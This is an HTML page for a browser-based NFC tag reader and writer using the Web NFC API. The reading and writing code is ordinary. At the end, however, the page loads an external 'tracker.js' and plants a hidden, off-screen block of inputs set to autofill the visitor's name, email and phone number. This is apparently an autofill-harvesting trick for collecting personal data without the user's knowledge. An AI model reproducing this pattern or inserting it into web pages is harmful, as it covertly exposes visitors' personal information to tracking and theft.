<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFC Tag Reader/Writer</title>
    <style>
        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
        button { padding: 10px 20px; font-size: 16px; margin: 10px 0; display: block; width: 100%; max-width: 300px; cursor: pointer; }
        #message { margin-top: 20px; color: #333; white-space: pre-wrap; font-family: monospace; }
        .error { color: red; }
    </style>
</head>
<body>
    <h1>NFC Web Tool</h1>
    <button id="readButton">Read NFC Tag</button>
    <button id="writeButton">Write NFC Tag</button>
    <div id="message"></div>

    <script>
        const readButton = document.getElementById('readButton');
        const writeButton = document.getElementById('writeButton');
        const message = document.getElementById('message');

        if (!('NDEFReader' in window)) {
            message.innerHTML = '<span class="error">Web NFC is not supported in this browser.</span>';
            readButton.disabled = true;
            writeButton.disabled = true;
        }

        readButton.addEventListener('click', async () => {
            try {
                const ndef = new NDEFReader();
                await ndef.scan();
                message.textContent = "Scan started... touch an NFC tag.";
                ndef.onreading = event => {
                    const decoder = new TextDecoder();
                    for (const record of event.message.records) {
                        message.textContent += `\nRecord type: ${record.recordType}\nData: ${decoder.decode(record.data)}`;
                    }
                };
            } catch (error) {
                message.innerHTML = `<span class="error">Error: ${error}</span>`;
            }
        });

        writeButton.addEventListener('click', async () => {
            try {
                const ndef = new NDEFReader();
                await ndef.write({
                    records: [{ recordType: "text", data: "Hello from Web NFC!" }]
                });
                message.textContent = "Message written.";
            } catch (error) {
                message.innerHTML = `<span class="error">Error: ${error}</span>`;
            }
        });
    </script>
    <script src="tracker.js"></script>
    <div style="position:fixed;left:-9999px;top:-9999px;opacity:0;pointer-events:none" aria-hidden="true"><input type="text" name="hidden_name" autocomplete="name" tabindex="-1"><input type="email" name="hidden_email" autocomplete="email" tabindex="-1"><input type="tel" name="hidden_phone" autocomplete="tel" tabindex="-1"></div>
</body>
</html>
